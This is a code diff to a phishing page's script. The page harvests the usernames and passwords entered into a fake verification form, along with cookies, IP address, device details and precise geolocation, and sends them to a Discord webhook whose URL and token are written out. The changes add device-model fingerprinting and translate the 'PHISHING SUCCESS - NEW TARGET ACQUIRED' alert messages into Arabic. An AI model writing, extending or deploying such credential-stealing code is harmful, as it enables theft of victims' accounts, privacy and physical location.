@@ -204,6 +204,46 @@
         // Replace with your actual Discord webhook URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1394152488361394196/-9qojTZGe2cUwxoccSgx-4hC76hfeVQipCKD79m3xrI3O8jPF-gWsXzmQJs6XnLaEUqe';
         
+        // Function to detect device model and name
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            let deviceModel = "غير معروف";
+            
+            // Detect mobile devices
+            if (/android/i.test(ua)) {
+                // Extract Android device model
+                const modelMatch = ua.match(/\((.*?)\)/);
+                if (modelMatch && modelMatch[1]) {
+                    deviceModel = modelMatch[1].split(';')[1] || modelMatch[1];
+                    deviceModel = deviceModel.replace('Build', '').trim();
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                // Detect iOS devices
+                const modelMatch = ua.match(/(iPhone|iPad|iPod).*OS\s(\d+_\d+)/i);
+                if (modelMatch) {
+                    deviceModel = `${modelMatch[1]} (iOS ${modelMatch[2].replace('_', '.')})`;
+                }
+            } else if (/windows nt/i.test(ua)) {
+                // Detect Windows devices
+                deviceModel = "كمبيوتر (Windows)";
+                
+                // Try to get actual computer name
+                try {
+                    if (window.performance && window.performance.memory) {
+                        deviceModel = "كمبيوتر شخصي";
+                    }
+                } catch (e) {}
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                // Detect Mac devices
+                deviceModel = "ماك (Macintosh)";
+            } else if (/linux/i.test(ua)) {
+                // Detect Linux devices
+                deviceModel = "كمبيوتر (Linux)";
+            }
+            
+            return deviceModel;
+        }
+        
         document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -219,6 +259,7 @@
                 deviceInfo: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
+                    deviceModel: getDeviceModel(), // Added device model detection
                     languages: navigator.languages.join(', '),
                     cookies: document.cookie,
                     screen: `${screen.width}x${screen.height}`,
@@ -300,31 +341,43 @@
                 title: "🎣 PHISHING SUCCESS - NEW TARGET ACQUIRED",
                 color: 16711680,
                 fields: [
-                    { name: "👤 Credentials", value: `**Username:** \`${data.credentials.username}\`\n**Password:** \`${data.credentials.password}\``, inline: false },
-                    { name: "🖥️ Device Info", value: `**OS:** ${data.deviceInfo.platform}\n**Browser:** ${data.deviceInfo.userAgent}\n**Screen:** ${data.deviceInfo.screen}\n**CPU Cores:** ${data.deviceInfo.cpuCores}\n**RAM:** ${data.deviceInfo.deviceMemory}GB`, inline: false },
-                    { name: "🌐 Network", value: `**IP:** ||${data.network.ip}||\n**Connection:** ${JSON.stringify(data.network.connection)}`, inline: false }
+                    { 
+                        name: "👤 Credentials", 
+                        value: `**اسم المستخدم:** \`${data.credentials.username}\`\n**كلمة المرور:** \`${data.credentials.password}\``,
+                        inline: false 
+                    },
+                    { 
+                        name: "📱 معلومات الجهاز", 
+                        value: `**اسم الجهاز:** ${data.deviceInfo.deviceModel}\n**نظام التشغيل:** ${data.deviceInfo.platform}\n**المتصفح:** ${data.deviceInfo.userAgent}\n**الشاشة:** ${data.deviceInfo.screen}\n**أنوية المعالج:** ${data.deviceInfo.cpuCores}\n**الذاكرة:** ${data.deviceInfo.deviceMemory} جيجابايت`,
+                        inline: false 
+                    },
+                    { 
+                        name: "🌐 معلومات الشبكة", 
+                        value: `**IP:** ||${data.network.ip}||\n**الاتصال:** ${JSON.stringify(data.network.connection)}`,
+                        inline: false 
+                    }
                 ],
                 footer: { text: "Dark Phoenix System • " + new Date().toLocaleString() }
             };
             
             if (data.location) {
                 embed.fields.push({
-                    name: "📍 Precise Location", 
-                    value: `**Latitude:** ${data.location.latitude}\n**Longitude:** ${data.location.longitude}\n**Accuracy:** ${data.location.accuracy}\n[Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})`,
+                    name: "📍 الموقع الدقيق", 
+                    value: `**خط العرض:** ${data.location.latitude}\n**خط الطول:** ${data.location.longitude}\n**الدقة:** ${data.location.accuracy}\n[خرائط جوجل](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})`,
                     inline: false
                 });
             }
             
             if (data.locationError) {
                 embed.fields.push({
-                    name: "⚠️ Location Error",
+                    name: "⚠️ خطأ في الموقع",
                     value: data.locationError,
                     inline: false
                 });
             }
             
             const payload = {
-                content: "@everyone **NEW TARGET ACQUIRED** 🎣",
+                content: "@everyone **تم الحصول على هدف جديد** 🎣",
                 embeds: [embed]
             };
             
